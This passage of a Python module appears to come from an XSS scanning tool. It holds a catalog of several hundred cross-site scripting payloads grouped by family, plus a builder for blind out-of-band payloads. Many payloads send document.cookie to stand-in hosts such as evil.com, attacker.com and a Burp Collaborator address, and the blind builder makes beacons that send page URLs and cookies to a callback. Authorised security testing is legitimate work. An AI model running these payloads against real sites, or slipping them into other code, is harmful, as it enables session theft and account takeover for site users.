        "#<svg><script>alert('DOM XSS')</script>",
        "#javascript:alert('DOM XSS')",
        '#data:text/html;base64,PHNjcmlwdD5hbGVydCgnRE9NIFhTUycpPC9zY3JpcHQ+',
        '#" onfocus="alert(\'DOM XSS\')" autofocus',
        '#" onclick="alert(\'DOM XSS\')">Click me',
        "#'><img src=x onerror=alert('DOM XSS')>",
    ),
    PayloadCategory.BLIND: (
        '<script src=https://your-burpcollaborator.com></script>',
        '"><script src=https://your-burpcollaborator.com></script>',
        '"><img src=x onerror=this.src=\'https://your-burpcollaborator.com\'>',
        '"><iframe src="javascript:eval(\'dGhpcy5sb2NhdGlvbiA9ICdodHRwczovL3lvdXItYnVycGNvbGxhYm9yYXRvci5jb20nOw==\')"></iframe>',
        '"><svg onload=eval(atob(\'YWxlcnQoJ0JsaW5kIFhTUycp\'))>',
        '"><body onload="fetch(\'https://your-burpcollaborator.com\')">',
        '"><link rel="stylesheet" href="https://your-burpcollaborator.com">',
        '"><a href="javascript:fetch(\'https://your-burpcollaborator.com\')">Click me</a>',
        '"><input value="" onfocus="fetch(\'https://your-burpcollaborator.com\')">',
        '"><div onmouseover="fetch(\'https://your-burpcollaborator.com\')">Hover me</div>',
        '"><img src=x onerror=eval(atob(\'YWxlcnQoJ0JsaW5kIFhTUycp\'))>',
        '"><svg onload="fetch(\'https://your-burpcollaborator.com\')">',
        '"><iframe src="javascript:fetch(\'https://your-burpcollaborator.com\')"></iframe>',
        '"><script>new Image().src=\'https://your-burpcollaborator.com?cookie=\'+document.cookie</script>',
        '"><img src=1 onerror="new Image().src=\'https://your-burpcollaborator.com?cookie=\'+document.cookie">',
        '"><img src=x onerror=\'fetch("https://your-burpcollaborator.com")\'>',
        '"><iframe src="javascript:alert(\'Blind XSS\')"></iframe>',
        '"><marquee onstart="fetch(\'https://your-burpcollaborator.com\')">Scroll me</marquee>',
    ),
    PayloadCategory.SELF: (
        'javascript:alert(document.cookie)',
        '<img src=x onerror=alert(document.cookie)>',
        '<svg onload=alert(document.cookie)>',
        '<iframe src="javascript:alert(document.cookie)"></iframe>',
        '<body onload="alert(document.cookie)">',
        '<a href="javascript:alert(document.cookie)">Click me</a>',
        '<input value="" onfocus="alert(document.cookie)">',
        '<div onmouseover="alert(document.cookie)">Hover me</div>',
        '<img src=x onerror="console.log(document.cookie)">',
        '<svg onload="console.log(document.cookie)">',
        "javascript:fetch('https://evil.com?cookie='+document.cookie)",
        '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">',
        '<iframe src="javascript:fetch(\'https://evil.com?cookie=\'+document.cookie)"></iframe>',
        '<svg onload="fetch(\'https://evil.com?cookie=\'+document.cookie)">',
        '<body onload="fetch(\'https://evil.com?cookie=\'+document.cookie)">',
        '<a href="javascript:fetch(\'https://evil.com?cookie=\'+document.cookie)">Click me</a>',
        '<input value="" onfocus="fetch(\'https://evil.com?cookie=\'+document.cookie)">',
        '<div onmouseover="fetch(\'https://evil.com?cookie=\'+document.cookie)">Hover me</div>',
        '<img src=x onerror="new Image().src=\'https://evil.com?cookie=\'+document.cookie">',
        '<svg onload="new Image().src=\'https://evil.com?cookie=\'+document.cookie">',
    ),
    PayloadCategory.MUTATION: (
        '<img src=x oNerrOr=alert(1)>',
        '<scr<script>ipt>alert(1)</script>',
        '"><img src=x oNerrOr=alert(1)>',
        '<svg onload=alert(1)>',
        '"><svg onload=alert(1)>',
        '<b onmouseover=alert(1)>Hover me</b>',
        '<input value=""><img src=x oNerrOr=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '"><iframe src="javascript:alert(1)"></iframe>',
        '<marquee onstart=alert(1)>Scroll me</marquee>',
        '<img src=x onerror="javascript:alert(1)">',
        '<b onmouseover="alert(1)">Hover me</b>',
        '<svg><script>alert(1)</script>',
        '<a href="javascript:alert(1)">Click me</a>',
        '"><marquee onstart="alert(1)">Scroll me</marquee>',
        '<svg><img src=x onerror="alert(1)"></svg>',
        '<input value=""><img src=x onerror="alert(1)">',
        '"><svg><script>alert(1)</script></svg>',
    ),
    PayloadCategory.POLYGLOT: (
        '<script src=//evil.com></script>',
        '">\'><script>alert(\'XSS\')</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '<a href="javascript:alert(1)">Click me</a>',
        '<input value="" onfocus=alert(1)>',
        '<div onmouseover=alert(1)>Hover me</div>',
        '<marquee onstart=alert(1)>Scroll me</marquee>',
    ),
    PayloadCategory.UXSS: (
        "<script>window.open('javascript:alert(1)')</script>",
        'javascript:alert(1)//',
        "<iframe src='javascript:alert(1)'></iframe>",
        "<img src=x onerror=window.open('javascript:alert(1)')>",
        "<svg/onload=window.open('javascript:alert(1)')>",
        'javascript://%0Aalert(1)',
        '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;1&#41;',
    ),
    PayloadCategory.ATTRIBUTE: (
        '<input type="text" value="" onfocus=alert(1)>',
        '<div onmouseover=alert(1)>Hover me</div>',
        '<body onload=alert(1)>',
        '<marquee onstart=alert(1)>Scroll me</marquee>',
        '<form action="javascript:alert(1)">Submit</form>',
        '<video src="x" onerror=alert(1)></video>',
        '<button onclick=alert(1)>Click me</button>',
        '<link rel="stylesheet" href="javascript:alert(1)">',
    ),
    PayloadCategory.COOKIE: (
        '<script>document.cookie="sessionid=abcd1234; path=/;"</script>',
        "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
        '<img src="x" onerror="document.cookie=\'xss=1\';alert(document.cookie)">',
        '<body onload="document.cookie=\'auth=admin\'">',
        '<script>document.write(\'<img src="http://attacker.com/?c=\'+escape(document.cookie)+\'">\')</script>',
        "<script>new Image().src='https://attacker.com/log?cookie='+document.cookie;</script>",
        '<svg/onload="alert(document.cookie)">',
        '<input type="hidden" value="" onfocus="alert(document.cookie)">',
        '<form action="javascript:alert(document.cookie)">Submit</form>',
    ),
    PayloadCategory.POST: (
        'username=<script>alert(1)</script>&password=1234',
        "name=John&comment=<img src=x onerror=alert('XSS')>",
        "email=test@example.com&feedback=<svg/onload=alert('XSS')>",
        "message=<iframe src=javascript:alert('XSS')></iframe>",
        'content=<a href="javascript:alert(\'XSS\')">Click me</a>',
        "data=<div onmouseover=alert('XSS')>Hover me</div>",
        "search=<input type='text' value='' onfocus=alert('XSS')>",
        "phone=<marquee onstart=alert('XSS')>Scroll me</marquee>",
        'info=<form action="javascript:alert(\'XSS\')">Submit</form>',
        "location=<video src=x onerror=alert('XSS')></video>",
    ),
    PayloadCategory.JSON: (
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<a href='javascript:alert('XSS')'>Click me</a>",
        "<div onmouseover=alert('XSS')>Hover me</div>",
        "<input type='text' value='' onfocus=alert('XSS')>",
        "<marquee onstart=alert('XSS')>Scroll me</marquee>",
        "<form action='javascript:alert('XSS')'>Submit</form>",
        "<video src=x onerror=alert('XSS')></video>",
    ),
}


def _build_catalog() -> Tuple[CatalogPayload, ...]:
    """Merge the corpus lists and README examples into one deduplicated catalog."""
    entries: List[CatalogPayload] = []
    seen: Set[Tuple[PayloadCategory, str]] = set()
    for source in (_CATALOG_DATA, _README_DATA):
        for category, vectors in source.items():
            meta = _CATEGORY_META[category]
            for vector in vectors:
                key = (category, vector)
                if key in seen:
                    continue
                seen.add(key)
                entries.append(
                    CatalogPayload(
                        payload=vector,
                        category=category,
                        contexts=meta.contexts,
                        tags=meta.tags,
                        auto=_auto_executes(vector),
                        reference=meta.reference,
                    )
                )
    # Keep each family contiguous so listings and context pools stay stable.
    order = {category: index for index, category in enumerate(PayloadCategory)}
    entries.sort(key=lambda entry: order[entry.category])
    return tuple(entries)


PAYLOAD_CATALOG: Tuple[CatalogPayload, ...] = _build_catalog()


def _build_context_index() -> Dict[str, Tuple[CatalogPayload, ...]]:
    """Group delivery-ready entries by context once, at import time.

    ``catalog_by_context`` used to walk all 440 entries on every call.  Scan
    startup builds one pool per context, and generated-payload helpers call it
    per injection point, so the grouping is computed once here instead.
    """
    index: Dict[str, List[CatalogPayload]] = {}
    for entry in PAYLOAD_CATALOG:
        if entry.reference:
            continue
        for context in entry.contexts:
            index.setdefault(context, []).append(entry)
    return {context: tuple(entries) for context, entries in index.items()}


#: Context name -> entries whose ``contexts`` include it (reference-only vectors excluded).
_CATALOG_BY_CONTEXT: Dict[str, Tuple[CatalogPayload, ...]] = _build_context_index()


def catalog_total() -> int:
    """Number of vectors in the bundled catalog."""
    return len(PAYLOAD_CATALOG)


def catalog_counts() -> Dict[str, int]:
    """Per-family vector counts (stable insertion order)."""
    counts: Dict[str, int] = {category.value: 0 for category in PayloadCategory}
    for entry in PAYLOAD_CATALOG:
        counts[entry.category.value] += 1
    return counts


def catalog_entries(
    category: Optional[PayloadCategory] = None,
    context: Optional[str] = None,
    auto_only: bool = False,
    include_reference: bool = False,
) -> List[CatalogPayload]:
    """Filter the catalog by family, context and execution behaviour."""
    if context is not None and not include_reference:
        candidates: Sequence[CatalogPayload] = _CATALOG_BY_CONTEXT.get(context, ())
    else:
        candidates = PAYLOAD_CATALOG
    selected: List[CatalogPayload] = []
    for entry in candidates:
        if category is not None and entry.category is not category:
            continue
        if context is not None and context not in entry.contexts:
            continue
        if auto_only and not entry.auto:
            continue
        if not include_reference and entry.reference:
            continue
        selected.append(entry)
    return selected


#: Memo for :func:`catalog_by_context`; keyed by (context, auto_only, include_reference, fallback).
_CONTEXT_TEMPLATE_CACHE: Dict[Tuple[str, bool, bool, bool], Tuple[str, ...]] = {}


def catalog_by_context(
    context: str,
    auto_only: bool = True,
    include_reference: bool = False,
    fallback: bool = True,
) -> List[str]:
    """Deduplicated, delivery-ready templates for one scanner context."""
    key = (context, auto_only, include_reference, fallback)
    cached = _CONTEXT_TEMPLATE_CACHE.get(key)
    if cached is not None:
        return list(cached)
    exact = catalog_entries(
        context=context, auto_only=auto_only, include_reference=include_reference
    )
    if not exact and context != "generic" and fallback:
        exact = catalog_entries(
            context="generic", auto_only=auto_only, include_reference=include_reference
        )
    seen: Set[str] = set()
    templates: List[str] = []
    for entry in exact:
        if entry.payload in seen:
            continue
        seen.add(entry.payload)
        templates.append(entry.payload)
    _CONTEXT_TEMPLATE_CACHE[key] = tuple(templates)
    return list(templates)


def describe_catalog() -> str:
    """Human-readable catalog inventory for --list-payload-catalog."""
    lines = [f"{catalog_total()} payload(s) from {CATALOG_SOURCE}"]
    for category, count in catalog_counts().items():
        lines.append(f"  {category:<16} {count:>3}")
    return "\n".join(lines)


# --------------------------------------------------------------------------------------
# Blind XSS / out-of-band payloads
# --------------------------------------------------------------------------------------

# Each template contains ``{beacon}``, a JS expression that fires an out-of-band
# request carrying the marker, the page URL and (best-effort) cookies.
_BLIND_TEMPLATES: Dict[str, List[str]] = {
    "html": [
        "<script>{beacon}</script>",
        '"><svg/onload="{beacon}">',
        '<img src=x onerror="{beacon}">',
        "<details open ontoggle=\"{beacon}\">",
    ],
    "attr_double": [
        '"><script>{beacon}</script>',
        '" onfocus="{beacon}" autofocus x="',
    ],
    "attr_single": [
        "'><script>{beacon}</script>",
        "' onfocus='{beacon}' autofocus x='",
    ],
    "attr_unquoted": [
        " onfocus={beacon} autofocus x=",
        "><script>{beacon}</script>",
    ],
    "script": [
        ";{beacon};//",
    ],
    "script_string": [
        '";{beacon};//',
        "';{beacon};//",
    ],
    "comment": [
        "--><script>{beacon}</script>",
    ],
    "url": [
        "javascript:{beacon}",
    ],
}

_BLIND_CONTEXTS = {
    "html": PayloadContext.HTML,
    "attr_double": PayloadContext.ATTR_DOUBLE,
    "attr_single": PayloadContext.ATTR_SINGLE,
    "attr_unquoted": PayloadContext.ATTR_UNQUOTED,
    "script": PayloadContext.JAVASCRIPT,
    "script_string": PayloadContext.JAVASCRIPT,
    "comment": PayloadContext.HTML,
    "url": PayloadContext.URL,
}


def build_blind_payloads(
    callback_url: str,
    marker: str,
    context: str = "html",
) -> List[Payload]:
    """
    Build out-of-band XSS payloads that call back to ``callback_url``.

    The callback receives ``m`` (marker), ``u`` (page URL) and ``c`` (cookies)
    query parameters, which is the convention used by XSS Hunter, interactsh
    and most self-hosted collectors.
    """
    if not callback_url:
        return []

    separator = "&" if "?" in callback_url else "?"
    callback = f"{callback_url}{separator}m={marker}"
    # Keep quotes and whitespace out of the embedded URL so the JS stays valid.
    callback = (
        callback.replace("'", "%27")
        .replace('"', "%22")
        .replace(" ", "%20")
        .replace("<", "%3C")
        .replace(">", "%3E")
    )
    beacon = (
        f"new Image().src='{callback}&u='+encodeURIComponent(location.href)"
        f"+'&c='+encodeURIComponent(document.cookie)"
    )

    templates = _BLIND_TEMPLATES.get(context) or _BLIND_TEMPLATES["html"]
    payload_context = _BLIND_CONTEXTS.get(context, PayloadContext.HTML)
    return [
        Payload(
            template=template.format(beacon=beacon),
            context=payload_context,
            marker=marker,
            description="Blind XSS out-of-band callback",
            tamper_resistant=True,
        )
        for template in templates
    ]
